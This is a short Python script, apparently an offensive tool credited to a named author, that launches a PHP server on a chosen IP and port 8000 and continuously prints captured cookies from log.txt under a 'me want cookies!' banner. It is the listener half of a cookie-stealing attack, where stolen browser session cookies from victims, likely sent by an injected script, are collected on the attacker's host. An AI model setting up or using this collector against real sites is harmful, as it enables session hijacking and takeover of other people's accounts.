#!/usr/bin/env python3
# Made by Charafeddine "M0R3H4X" from Dataprotect
import sys
import os
from colorama import init
from subprocess import Popen
from time import sleep
os.system("clear && : > log.txt")
print("""
                .---. .---.
               :     : o   :    me want cookies!
           _..-:   o :     :-.._    /
       .-''  '  `---' `---' "   ``-.
     .'   "   '  "  .    "  . '  "  `.
    :   '.---.,,.,...,.,.,.,..---.  ' ;
    `. " `.                     .' " .'
     `.  '`.                   .' ' .'
      `.    `-._           _.-' "  .'  .----.
        `. "    '"--...--"'  . ' .'  .'  o   `.
        .'`-._'    " .     " _.-'`. :       o  :
      .'      ```--.....--'''    ' `:_ o       :
    .'    "     '         "     "   ; `.;";";";'
   ;         '       "       '     . ; .' ; ; ;
  ;     '         '       '   "    .'      .-'
  '  "     "   '      "           "    _.-'
                  M0R3H4X
""")
ip   = str(input('Enter Your IP: '))
port = str(int(8000))

def runServer():
    x = Popen(['php', '-S', ip+':'+port])

def waitCookies():
    print('Waiting for the yummy cookies...\n')
    while True:
        with open('./log.txt') as cookie:
            lines = cookie.read().rstrip()
        if len(lines) != 0:
            print('[COOKIE]: %s' % lines)
        cookie.close()

def main():
    runServer()
    waitCookies()

if __name__ == "__main__":
    main()
